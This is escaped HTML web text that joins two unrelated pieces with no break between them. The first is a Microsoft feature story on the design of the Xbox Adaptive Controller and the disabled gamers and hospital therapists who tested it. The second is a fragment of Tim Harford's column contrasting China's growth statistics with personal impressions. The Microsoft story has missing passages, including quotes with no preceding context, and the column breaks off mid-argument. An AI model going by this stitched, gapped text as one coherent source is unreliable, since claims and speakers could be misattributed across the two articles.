&lt;p class=&quot;c-drop-cap c-constrained-wrapper u-align-left u-pad-t-md u-vw12of28 u-marg-r-vw3of28 c-text--md | u-pad-t-0@sm u-fit-w@sm u-marg-a-0@sm u-pad-x-vw1of14@sm&quot; light-dom-id=&quot;41&quot;&gt;&lt;span light-dom-id=&quot;41&quot;&gt;In 2017, Microsoft released a new feature for Xbox One called &lt;a title=&quot;Copilot website&quot; href=&quot;https://support.xbox.com/en-US/xbox-one/accessories/copilot&quot; class=&quot;u-color--dark&quot; target=&quot;_blank&quot; light-dom-id=&quot;41&quot;&gt;Copilot&lt;/a&gt; that links two controllers as if they were one, enabling people to play together without transferring the controller back and forth. That's helpful if a player has trouble operating all of the buttons on a single controller — so two players can team up on a game, for example, with one driving and the other firing. Copilot also allows players to create custom gaming setups that work for them. If a gamer is playing with one hand, a second controller can be linked with Copilot and operated with a head or foot.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;
The feature quickly became one of Xbox's most popular and is being used in ways its creators hadn't imagined, Johnson said. He mentioned a man who is blind and loved playing video games with his wife before he lost his sight, and rekindled that shared experience through Copilot.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;&lt;q light-dom-id=&quot;41&quot;&gt;With Copilot, he now has the opportunity to play with her again,&lt;/q&gt; Johnson said. &lt;q light-dom-id=&quot;41&quot;&gt;It's opened up such a wide variety of capabilities.&lt;/q&gt;&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;
The feature was instrumental in driving the evolution of the Xbox Adaptive Controller. As Copilot moved toward release, Microsoft realized that instead of creating an adaptive device that attached to an Xbox, like the hackathon-generated invention, it could instead develop a stand-alone unit that could connect with another controller via Copilot and accommodate more ports than would easily fit on the initial prototype device. Disabled gamers would get greater flexibility, and the controller would be a more elegant solution than an unwieldy add-on with wires hanging off in various directions.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;
But taking a product, particularly one designed for a specific market, from concept to completion isn't a straightforward proposition. As plans for the controller moved forward, Microsoft was also launching &lt;a title=&quot;Xbox One X website&quot; href=&quot;https://www.xbox.com/en-US/xbox-one-x&quot; class=&quot;u-color--dark&quot; target=&quot;_blank&quot; light-dom-id=&quot;41&quot;&gt;Xbox One X&lt;/a&gt;, the world's most powerful console, leaving deadline-focused Xbox employees with little bandwidth for other work.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;
And like any other area of the company, Xbox was expected to operate within financial constraints. An adaptive controller wouldn't necessarily generate a significant return on investment. But it was important to Microsoft's goal of making gaming more accessible to people with disabilities, and it spoke directly to the company's mission, implemented under CEO Satya Nadella, to enable every person and organization on the planet to achieve more.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;&lt;q light-dom-id=&quot;41&quot;&gt;Trying to develop a business case for an accessible product can be very, very challenging, because the scale of the products don't generally make a positive business case for the investment that has to go in,&lt;/q&gt; said Leo Del Castillo, who was the general manager for Xbox hardware when the controller was being developed.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;&lt;q light-dom-id=&quot;41&quot;&gt;You have to look at your return on investment in a way that is not just financial.&lt;/q&gt;&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;
Castillo and a core group of dedicated employees helped push the project forward. Securing the needed approvals wasn't always easy, and it meant convincing the right people that an accessible device was worth the outsized investment. Hunter was among the project's dogged champions.&lt;br light-dom-id=&quot;41&quot;/&gt;
 &lt;br light-dom-id=&quot;41&quot;/&gt;&lt;q light-dom-id=&quot;41&quot;&gt;I had a passion for it and I didn't give up,&lt;/q&gt; she said. &lt;q light-dom-id=&quot;41&quot;&gt;I kept saying, 'This product is too important. It's too important to Microsoft, it's too important to Satya's vision. If we really want to be intentional and we really want to walk the walk versus just talk the talk, this is the product that will do it.'&lt;/q&gt;&lt;/span&gt;&lt;/p&gt;

The philosophy is a priority across the company, from Xbox to Office, and has led to accessibility features being built in to various products and apps. But the Xbox Adaptive Controller is the first piece of hardware launched by Microsoft that was developed through an inclusive design approach that included extensive consultation with gamers who have disabilities.&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;
Creating the controller involved dozens of employees across Microsoft, from engineers to product testers. Since the device is the first of its type from the company, determining what it needed to best serve gamers with disabilities was challenging, project manager Gabi Michel said.&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;&lt;q light-dom-id=&quot;50&quot;&gt;We know how to make a controller, and we know how to make a really great controller,&lt;/q&gt; she said. &lt;q light-dom-id=&quot;50&quot;&gt;But we didn't know how to make a really great accessible controller.&lt;/q&gt;&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;
So the project team turned to the experts, consulting with gamers, accessibility advocates and nonprofits that work with disabled gamers. Their feedback helped shape many of the controller's features, down to its packaging. The 19 jacks across the back of the device, mimicking the number of inputs on a standard controller, are spread out in a single line rather than being stacked so they're easily accessible for people with dexterity challenges. The controller's rectangular shape is designed to sit comfortably in users' laps without falling between their legs or requiring them to sit in an awkward position.&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;
After discovering that some gamers arrange their gaming setups on a lap board, often securing them with Velcro, the design team added three threaded inserts to the controller so it can be mounted with industry-standard hardware and attached to a wheelchair, lap board or desk.&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;&lt;q light-dom-id=&quot;50&quot;&gt;Giving them the ability to put the controller where they need to have it was a really important aspect of the design,&lt;/q&gt; said Chris Kujawski, the Microsoft senior industrial designer who worked on the project.&lt;br light-dom-id=&quot;50&quot;/&gt;
 &lt;br light-dom-id=&quot;50&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;br light-dom-id=&quot;46&quot;/&gt;&lt;div class=&quot;u-block u-relative u-align-left u-vw9of28 u-marg-r-vw3of28 | u-marg-b-sm@sm u-fit-w@sm u-block@sm&quot; light-dom-id=&quot;51&quot;&gt;&lt;img src=&quot;data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%20615%20341'%2F%3E&quot; alt=&quot;&quot; class=&quot;u-fit-w&quot; role=&quot;presentation&quot; aria-hidden=&quot;true&quot; root-node=&quot;1&quot; has-binding=&quot;&quot;/&gt;&lt;img alt=&quot;Feedback from gamers and advocates helped shape the controller's design.&quot; class=&quot;u-fit-w u-pos-tl u-absolute&quot; root-node=&quot;3&quot; has-binding=&quot;&quot; src=&quot;https://news.microsoft.com/stories/xbox-adaptive-controller/assets/images/responsive/closeup-1024.jpg&quot;/&gt;&lt;span light-dom-id=&quot;52&quot;&gt;Feedback from gamers and advocates helped shape the controller's design.&lt;/span&gt;&lt;/div&gt;
&lt;p class=&quot;c-constrained-wrapper u-align-left u-block u-vw12of28 c-text--md | u-fit-w@sm u-pad-x-vw1of14@sm&quot; light-dom-id=&quot;51&quot;&gt;&lt;span light-dom-id=&quot;51&quot;&gt;Symbols embossed along the rear edge at the top of the controller identify each port on the back so users don't have to lift or turn the device around to find the right one. And grooves above each port provide a physical reference to help guide plugs into them, a feature that Microsoft is now considering adding to other products.&lt;br light-dom-id=&quot;51&quot;/&gt;
 &lt;br light-dom-id=&quot;51&quot;/&gt;
An early prototype of the device had the D-pad and other controls between the two large A and B buttons on its top. But after listening to feedback from gamers, the team moved the controls off to the side and slid the two buttons closer together so gamers can rest a hand between them and easily move between the buttons.&lt;br light-dom-id=&quot;51&quot;/&gt;
 &lt;br light-dom-id=&quot;51&quot;/&gt;
Other changes included rounding the controller's edges to reduce the impact if it's dropped on a foot, and lowering and softening the front edge so users can slide their hands onto the device without having to lift them and also rest them without discomfort. The sloped design provided an unexpected benefit.&lt;br light-dom-id=&quot;51&quot;/&gt;
 &lt;br light-dom-id=&quot;51&quot;/&gt;&lt;q light-dom-id=&quot;51&quot;&gt;Although that wasn't the intent, we found that angling that surface made it easier to use the controller with your feet, because it presented the buttons to your feet in a more natural way,&lt;/q&gt; Kujawski said.&lt;br light-dom-id=&quot;51&quot;/&gt;
 &lt;br light-dom-id=&quot;51&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

 &lt;br light-dom-id=&quot;54&quot;/&gt;&lt;q light-dom-id=&quot;54&quot;&gt;We were very cognizant of that, right from the beginning,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;54&quot;&gt;We wanted it to feel — from a color perspective, the shapes that we used, the quality of the assembly — all those aspects had to feel like an Xbox product, a first-party product that we had put a lot of care and effort into.&lt;/q&gt;&lt;br light-dom-id=&quot;54&quot;/&gt;

The gamers the Microsoft team consulted with had one major stipulation about that: no teeth.&lt;br light-dom-id=&quot;54&quot;/&gt;
 &lt;br light-dom-id=&quot;54&quot;/&gt;&lt;q light-dom-id=&quot;54&quot;&gt;They talked about having to use their teeth for everything, from opening beer bottles to soup cans,&lt;/q&gt; said Scott Wang, a design researcher for Xbox hardware. &lt;q light-dom-id=&quot;54&quot;&gt;They told us that if nothing else, there should be no teeth required to open this product.&lt;/q&gt;&lt;br light-dom-id=&quot;54&quot;/&gt;

 &lt;br light-dom-id=&quot;57&quot;/&gt;&lt;q light-dom-id=&quot;57&quot;&gt;We spoke with gamers who have disabilities and tried to put ourselves in the position of the people who would unbox the product,&lt;/q&gt; said Mark Weiser, the Microsoft designer who created the packaging. &lt;q light-dom-id=&quot;57&quot;&gt;We wanted to make sure we saw it through the lens of someone who would potentially open this.&lt;/q&gt;&lt;br light-dom-id=&quot;57&quot;/&gt;
 &lt;br light-dom-id=&quot;57&quot;/&gt;
Trying to accommodate a broad range of disabilities made for a challenging but rewarding project, Kujawski said.&lt;br light-dom-id=&quot;57&quot;/&gt;
 &lt;br light-dom-id=&quot;57&quot;/&gt;&lt;q light-dom-id=&quot;57&quot;&gt;Microsoft makes a lot of cool products, and Xbox in particular does, but you have very few opportunities in your life or career to make a product that will so positively impact someone's life as this one will, and I really believe that it will,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;57&quot;&gt;It's pretty cool to be a part of that.&lt;/q&gt;&lt;br light-dom-id=&quot;57&quot;/&gt;
 &lt;br light-dom-id=&quot;57&quot;/&gt;
Talking with Kujawski and other employees who worked on the controller, something quickly becomes clear: This was no ordinary project. It was one employees &lt;em light-dom-id=&quot;57&quot;&gt;wanted&lt;/em&gt; to work on, one that inspired a collective passion and commitment.&lt;br light-dom-id=&quot;57&quot;/&gt;
 &lt;br light-dom-id=&quot;57&quot;/&gt;&lt;q light-dom-id=&quot;57&quot;&gt;This program is a labor of love for a lot of people,&lt;/q&gt; Michel said. &lt;q light-dom-id=&quot;57&quot;&gt;It's one of the few programs I've worked on where everyone involved just really, really wants to see this ship, will do almost anything to get it out the door. Everyone's really excited about it.&lt;/q&gt;&lt;br light-dom-id=&quot;57&quot;/&gt;

Controllers just had a single digital joystick, or a rotating wheel, and maybe a button or two. But as the industry evolved in the 1980s and ‘90s, controllers, systems and games themselves became increasingly sophisticated and challenging to navigate. The simplicity of the dot-eating Pac-Man gave way to characters who had to jump, shoot, run, battle enemies and navigate their way through dizzyingly fast, multilayered scenarios.&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;
Those complexities have meant that gamers with disabilities are often limited in what they can play — or even shut out of gaming altogether. With 65 percent of American households playing video games in 2017, according to the &lt;a title=&quot;Entertainment Software Association website&quot; href=&quot;http://www.theesa.com/article/2017-essential-facts-computer-video-game-industry&quot; class=&quot;u-color--dark&quot; target=&quot;_blank&quot; light-dom-id=&quot;68&quot;&gt;Entertainment Software Association&lt;/a&gt;, that's a significant cultural segment to miss out on.&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;&lt;q light-dom-id=&quot;68&quot;&gt;Part of why gaming is important to people with disabilities is because gaming is important, full stop, across the board,&lt;/q&gt; said Ian Hamilton, a game accessibility specialist and consultant who lives in England. &lt;q light-dom-id=&quot;68&quot;&gt;It is a really deeply entrenched part of our culture now, which makes it a really big deal to be excluded from.&lt;/q&gt;&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;
April Dickerson understands that as well as anyone. As a child growing up in rural Tennessee, Dickerson would try to play basketball or football with the neighborhood kids, but it was hard to keep up. She was born with spinal muscular atrophy, a progressive disorder that impacts muscle movement. Video games offered an escape to a world with few limitations.&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;&lt;q light-dom-id=&quot;68&quot;&gt;In real life, if you have any kind of different abilities, you're constantly trying to adjust to what you're doing,&lt;/q&gt; said Dickerson, now 39 and an avid gamer. &lt;q light-dom-id=&quot;68&quot;&gt;But in video games, everybody can have the same experience.&lt;/q&gt;&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;
Dickerson switched to PC-based games about eight years ago, after she was no longer able to navigate a traditional controller. How to accommodate players like her is a question the gaming industry, including Microsoft, has been grappling with for years. Given the highly personalized nature of disabilities, a one-size-fits-all solution has been elusive. One gamer might be able to play a particular game, while another with the same disability can't. A gamer who is blind has different challenges than, say, a gamer who plays without hands.&lt;br light-dom-id=&quot;68&quot;/&gt;
 &lt;br light-dom-id=&quot;68&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

Disabled gamers emerged over the decades as a subset of hackers, modifying equipment themselves out of necessity, while nonprofit organizations sprung up to help meet their growing demand for assistive gaming technology.&lt;br light-dom-id=&quot;71&quot;/&gt;
 &lt;br light-dom-id=&quot;71&quot;/&gt;
Steve Spohn was among those early DIYers. He began gaming at around age 5, when his mom bought him an Atari. But as his spinal muscular atrophy progressed, Spohn had trouble operating a controller. He switched to PC-based gaming, but that became problematic too. At one point, struggling to use a keyboard, Spohn used a dental hygienist tool as an extender, resting his hand by the space bar and using the tool to reach the upper keys.&lt;br light-dom-id=&quot;71&quot;/&gt;
 &lt;br light-dom-id=&quot;71&quot;/&gt;&lt;q light-dom-id=&quot;71&quot;&gt;I had been doing stuff like that for years,&lt;/q&gt; he said. “My mom taught me that you take an everyday object and repurpose it for something you need it for, and that's how you continue surviving in the world. So I would get a faster mouse or a keyboard with the buttons spread out differently. But eventually, the off-the-shelf solutions stopped working.&lt;br light-dom-id=&quot;71&quot;/&gt;
 &lt;br light-dom-id=&quot;71&quot;/&gt;&lt;q light-dom-id=&quot;71&quot;&gt;When I was at the point where I was just no longer able to use the keyboard, I started panicking, because gaming was a large part of my life,&lt;/q&gt; said Spohn, who now plays with a Quadstick. &lt;q light-dom-id=&quot;71&quot;&gt;That's when I needed to turn to a place for help.&lt;/q&gt;&lt;br light-dom-id=&quot;71&quot;/&gt;
 &lt;br light-dom-id=&quot;71&quot;/&gt;
That place was &lt;a title=&quot;The AbleGamers Charity website&quot; href=&quot;http://www.ablegamers.org&quot; class=&quot;u-color--dark&quot; target=&quot;_blank&quot; light-dom-id=&quot;71&quot;&gt;The AbleGamers Charity&lt;/a&gt;, a West Virginia-based nonprofit launched in 2004, where Spohn is now the chief operating officer. Like Warfighter Engaged, the organization provides disabled gamers with custom setups like modified controllers and devices that allow them to play with their eyes. Spohn is among the experts Microsoft consulted with in developing the Xbox Adaptive Controller, and he believes the device has the potential to help many gamers.&lt;br light-dom-id=&quot;71&quot;/&gt;
 &lt;br light-dom-id=&quot;71&quot;/&gt;&lt;q light-dom-id=&quot;71&quot;&gt;It's going to be a great controller for those who need it,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;71&quot;&gt;This has been such a long time coming.&lt;/q&gt;&lt;br light-dom-id=&quot;71&quot;/&gt;

 &lt;br light-dom-id=&quot;86&quot;/&gt;
Hamilton said the controller is a significant advancement in the gaming industry's efforts to increase accessibility.&lt;br light-dom-id=&quot;86&quot;/&gt;
 &lt;br light-dom-id=&quot;86&quot;/&gt;&lt;q light-dom-id=&quot;86&quot;&gt;The progress across the industry is being felt through all kinds of initiatives, but going to the extent of manufacturing commercial hardware is really a different kind of level,&lt;/q&gt; he said. “The kind of commitments and process involved in that make it a really powerful statement of intent. You don't commit to an endeavor like this unless it is something that you really passionately care about.&lt;br light-dom-id=&quot;86&quot;/&gt;
 &lt;br light-dom-id=&quot;86&quot;/&gt;&lt;q light-dom-id=&quot;86&quot;&gt;There have been great people within Microsoft pushing for game accessibility for a long time,&lt;/q&gt; Hamilton said. &lt;q light-dom-id=&quot;86&quot;&gt;But for those efforts to translate into lasting cultural change, you also need top-down support, people at higher levels who understand and care and want to empower their staff to be able to push on forwards — people like Phil Spencer and Satya Nadella.&lt;/q&gt;&lt;br light-dom-id=&quot;86&quot;/&gt;
 &lt;br light-dom-id=&quot;86&quot;/&gt;
Spencer, executive vice president of gaming at Microsoft, said the new controller advances the company's commitment to enable all gamers to play.&lt;br light-dom-id=&quot;86&quot;/&gt;
 &lt;br light-dom-id=&quot;86&quot;/&gt;&lt;q light-dom-id=&quot;86&quot;&gt;Gaming &lt;em light-dom-id=&quot;86&quot;&gt;can&lt;/em&gt; be one of the great equalizers and great unifiers for society, but we need to do more to broaden that audience,&lt;/q&gt; he said. “The Xbox Adaptive Controller represents the positive impact technology can have, when that technology is designed to include as many people as possible.&lt;br light-dom-id=&quot;86&quot;/&gt;
 &lt;br light-dom-id=&quot;86&quot;/&gt;&lt;q light-dom-id=&quot;86&quot;&gt;Whether someone lost the ability to play or they've never been able to try gaming in the first place, this controller will hopefully make having fun in the gaming community a possibility.&lt;/q&gt;&lt;/span&gt;&lt;/p&gt;

 &lt;br light-dom-id=&quot;94&quot;/&gt;
But this session on a recent morning at Craig Hospital in Englewood, Colorado, where the 19-year-old is being treated, was different. With the Xbox Adaptive Controller, Snead, an avid gamer, was able to play her favorite game for the first time since the accident. She knew exactly how many days — 60 — had passed since she'd fired up “Call of Duty: Modern Warfare,” which used to be part of her daily routine.&lt;br light-dom-id=&quot;94&quot;/&gt;
 &lt;br light-dom-id=&quot;94&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

 &lt;br light-dom-id=&quot;99&quot;/&gt;&lt;q light-dom-id=&quot;99&quot;&gt;I went to my happy place for the first time since the accident. It made me feel comfortable, like life was back to how it was before everything happened,&lt;/q&gt; she said, smiling. &lt;q light-dom-id=&quot;99&quot;&gt;I felt at home for the first time, like I was really at home.&lt;/q&gt;&lt;br light-dom-id=&quot;99&quot;/&gt;
 &lt;br light-dom-id=&quot;99&quot;/&gt;
The hospital, which specializes in rehabilitation for patients with spinal cord and brain injuries, has been testing the new Xbox controller as part of its Adaptive Gaming Program. The program started three years ago, after a new patient who was a passionate gamer arrived at the hospital. The young man was depressed and unwilling to take part in his therapy sessions. If he couldn't game, he told his primary therapist, he didn't see the point in doing anything.&lt;br light-dom-id=&quot;99&quot;/&gt;
 &lt;br light-dom-id=&quot;99&quot;/&gt;
The therapist reached out to Erin Muston-Firsch, an assistive technology specialist at the hospital, and asked if she could help. Working with the hospital's rehabilitation engineer, Muston-Firsch put together a crude customized gaming setup for the young man. It &lt;q light-dom-id=&quot;99&quot;&gt;looked like Frankenstein,&lt;/q&gt; she said, but it worked.&lt;br light-dom-id=&quot;99&quot;/&gt;
 &lt;br light-dom-id=&quot;99&quot;/&gt;
Other patients noticed and wanted in on the action, and their interest led Muston-Firsch to set up the gaming program. She built up a stock of assistive gaming devices and taught her coworkers how to use them. But the setups were kludgy and complicated to set up. Sometimes they crashed, as the patients sat waiting. Their disappointment pained Muston-Firsch.&lt;br light-dom-id=&quot;99&quot;/&gt;
 &lt;br light-dom-id=&quot;99&quot;/&gt;&lt;q light-dom-id=&quot;99&quot;&gt;It's terrible if you set somebody up on something you think is going to work and get their hopes up, and then watch them struggle and get discouraged,&lt;/q&gt; she said. &lt;q light-dom-id=&quot;99&quot;&gt;And in the past, if one controller didn't work, it may have taken you 10 or 15 minutes to get that all set up for them, and now you have to take it all apart and start over.&lt;/q&gt;&lt;br light-dom-id=&quot;99&quot;/&gt;
 &lt;br light-dom-id=&quot;99&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

 &lt;br light-dom-id=&quot;102&quot;/&gt;&lt;q light-dom-id=&quot;102&quot;&gt;When you think about sending patients home who are more dependent, and you have to train their family members or friends to set things up, we don't want it to be a daunting process for them,&lt;/q&gt; she said. &lt;q light-dom-id=&quot;102&quot;&gt;We want them to be successful when they go home.&lt;/q&gt;&lt;br light-dom-id=&quot;102&quot;/&gt;
 &lt;br light-dom-id=&quot;102&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;c-constrained-wrapper c-anim--slide-y c-anim--2 u-align-left c-text--md u-inline-block u-valign-top u-vw8of28 | u-fit-w@sm u-pad-x-vw1of14@sm&quot; light-dom-id=&quot;102&quot;&gt;&lt;span light-dom-id=&quot;102&quot;&gt;So when Microsoft reached out to the hospital about testing the Xbox Adaptive Controller, Muston-Firsch and Scroggs were excited. They've been using the device with patients for a few months and say it's enabled them to get patients gaming quickly and easily change their setups as needed. Some patients play only with the controller's two buttons, while others use a personalized combination of joysticks and buttons plugged into the device.&lt;br light-dom-id=&quot;102&quot;/&gt;
 &lt;br light-dom-id=&quot;102&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p class=&quot;c-constrained-wrapper u-align-left u-inline-block u-vw12of28 u-marg-r-vw1of28 c-text--md | u-fit-w@sm u-pad-x-vw1of14@sm&quot; has-binding=&quot;&quot; light-dom-id=&quot;105&quot;&gt;&lt;span light-dom-id=&quot;105&quot;&gt;&lt;q light-dom-id=&quot;105&quot;&gt;We can build and switch as they're playing and not have to ask them to be patient, when they're in a whole world of having to be patient,&lt;/q&gt; Scroggs said. &lt;q light-dom-id=&quot;105&quot;&gt;They'll say, ‘I used to be a gamer,' and we'll say, ‘No, no, you &lt;em light-dom-id=&quot;105&quot;&gt;are&lt;/em&gt; a gamer and we're going to figure this out.' I think that's one of the biggest things it's done for us.&lt;/q&gt;&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;
And the controller's $99.99 price puts it within reach of gamers who might not be able to afford other typically pricey adaptive technologies, Muston-Firsch said.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;&lt;q light-dom-id=&quot;105&quot;&gt;Price point was a big deal when Microsoft was talking to us about this controller. Having something affordable is huge,&lt;/q&gt; she said.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;
On a recent Thursday evening, half a dozen patients at Craig Hospital gathered in the hospital's therapy gym for its weekly gaming night. As his mom, Wendy, looked on, 22-year-old Hamilton Coke played “Madden NFL 16.” A gamer since getting his first Xbox at age 6, Coke played regularly until February, when he injured his spine in a ski accident.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;&lt;q light-dom-id=&quot;105&quot;&gt;When I got hurt, I was literally laying in the snow thinking about all the things that I wouldn't be able to do,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;105&quot;&gt;At one point in ICU I was thinking, I probably won't be able to ski or surf again, but I really hope I can get my fingers back so I can still play video games.&lt;/q&gt;&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;
Coke has been playing with the Xbox Adaptive Controller and appreciates how easy it is to hit the buttons. &lt;q light-dom-id=&quot;105&quot;&gt;It's very helpful,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;105&quot;&gt;It's pretty cool.&lt;/q&gt;&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;
Nearby, Snead was taking down enemies in &lt;q light-dom-id=&quot;105&quot;&gt;Call of Duty,&lt;/q&gt; with Muston-Firsch providing scoping assistance using Copilot, while her family members cheered her on.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;&lt;q light-dom-id=&quot;105&quot;&gt;We just got done saving the president!&lt;/q&gt; she announced, chuckling.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;
One of Snead's brothers, Exzavier Harris, who frequently plays with her at home, was impressed by the new Xbox controller. He liked its lightness and shape. He liked how it sat easily on a lap. Most of all, he liked what he saw it doing for the gamers.&lt;br light-dom-id=&quot;105&quot;/&gt;
 &lt;br light-dom-id=&quot;105&quot;/&gt;&lt;q light-dom-id=&quot;105&quot;&gt;With that controller, they're having fun,&lt;/q&gt; he said, watching the patients play. &lt;q light-dom-id=&quot;105&quot;&gt;I see how it's making my sister happy, and I like that.&lt;/q&gt;&lt;br light-dom-id=&quot;105&quot;/&gt;

<title>Statistics, Fast and Slow</title>

<guid isPermaLink="true" >http://timharford.com/2018/05/statistics-fast-and-slow/</guid>
<description>&lt;a href=&quot;http://timharford.com/articles/undercovereconomist/&quot; title=&quot;Undercover Economist&quot;&gt;&lt;img class=&quot;article-perm&quot; src=&quot;http://timharford.com/wp-content/themes/timharford-v4/img//icon-ue.png&quot; width=&quot;36&quot; height=&quot;36&quot; alt=&quot;Undercover Economist&quot; title=&quot;Undercover Economist&quot;/&gt;&lt;/a&gt;&lt;h2&gt;Statistics, Fast and Slow&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Written for and first published in the &lt;a href=&quot;https://www.ft.com/content/6fac587c-3e3c-11e8-b9f9-de94fa33a81e&quot;&gt;Financial Times&lt;/a&gt; on 13 April 2018.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;One way to understand China is to look at the statistics. Real income per person has increased nearly tenfold since 1990. Since the early 1980s, the number of extremely poor people in China has fallen by more than three-quarters of a billion people, more than half the population of the country. China consumed more cement in a recent three-year period than the US used in the entire 20th century.&lt;/p&gt;
&lt;p&gt;Even on paper, it is the most dramatic explosion of economic activity in human history. Seeing it with your own eyes is another experience entirely.&lt;/p&gt;
&lt;p&gt;Nothing in the statistics truly prepared me for a journey across Guangdong, the southern province of China that has been at the forefront of this growth. Start at Hong Kong — the ultimate high-rise city — and walk into its mainland twin, Shenzhen. Then in the shadow of the Ping An skyscraper, which dwarfs the Empire State building, catch a bullet train across the province.&lt;/p&gt;
&lt;p&gt;Where London might have a single big block like Trellick Tower, Shenzhen will have a cluster of a dozen identical monoliths, crammed with apartments. Next to that cluster, another dozen of a different design. Then another, and another. Here and there, in the distance across the haze, would be a Manhattan-esque cluster of skyscrapers. The towers marched on and on, all the way — or so it seemed to me — to the city of Guangzhou: 45 minutes or so of high-speed travel through what seemed an infinite vista of concrete.&lt;/p&gt;
&lt;p&gt;That night, tucked into bed in the picture-postcard landscape of Yangshuo, I couldn’t sleep. The endless tower blocks scrolled through my mind. What if we had lost our six-year-old son in the middle of Guangdong? So many people. So much concrete.&lt;/p&gt;
&lt;p&gt;There was nothing in this experience to contradict the economic data; in fact, the two perspectives on China’s growth were perfectly complementary. But they felt very different. To borrow the terminology made famous by Daniel Kahneman’s book &lt;em&gt;Thinking, Fast and Slow&lt;/em&gt;, (&lt;a href=&quot;https://amzn.to/2EF0tQB&quot;&gt;UK&lt;/a&gt;) (&lt;a href=&quot;https://amzn.to/2v6fhrK&quot;&gt;US&lt;/a&gt;) the statistics spoke to my mental “system 2” — the deliberate, effortful processing of logical or mathematical information. The train journey tapped into “system 1”, a swift and automatic forming of impressions, making of comparisons and recognising of dangers. This was statistics, fast and slow.&lt;/p&gt;
&lt;p&gt;Some will be tempted to dismiss the statistics as irrelevant book-learning, and declare that only personal experience matters. There is certainly something in that, especially when a situation is fast-moving or contains soft, hard-to-quantify details. As the Nobel laureate economist Friedrich Hayek remarked, the “knowledge of the particular circumstances of time and place” is important and often neglected.&lt;/p&gt;
&lt;p&gt;HR McMaster — who before he was US president Donald Trump’s former national security adviser, was a counterinsurgency pioneer in Iraq — had a similar concern. He once told me the army used to wrongly believe that “situational understanding could be delivered on a computer screen”. It would be convenient if that was possible, but as Gen McMaster and his colleagues learnt the hard way, it is not. Sometimes you have to be there to understand.&lt;/p&gt;
&lt;p&gt;But while there is a lot to be said for the rich and vivid lessons of personal experience, they have an obvious limitation: we cannot be everywhere and see everything. And what we do see may be as unrepresentative as the sloppiest of surveys. My trip to China took in tourist spots and high-speed rail links. As a result, I formed an indelible impression of a very particular slice of China.&lt;/p&gt;
&lt;p&gt;The skew in our personal experience affects us when at home almost as much as when travelling. We are surprised when an election goes against us: all our friends agreed with us, so why did the nation vote otherwise? Newspapers and television carry tales of lottery wins and fairytale romances, terrorist atrocities or gruesome assaults by strangers. None of these stories reflect everyday life; all of them are viscerally memorable and seem to take place in our living rooms.&lt;/p&gt;
&lt;p&gt;And there are more subtle ways in which personal experience can mislead. For example, most of us who ride on London buses will attest that they are packed. Yet the average occupancy of a London bus is just 17 people. How so? Most people witness the full buses — that is why they are full — while empty buses are observed only by their drivers.&lt;/p&gt;
&lt;p&gt;It is not quite fair to say that our fast-and-loose “system 1” impression is a lie. It really is true that most people travel on busy buses. But if we want to understand emissions per passenger, we need a statistical perspective.&lt;/p&gt;
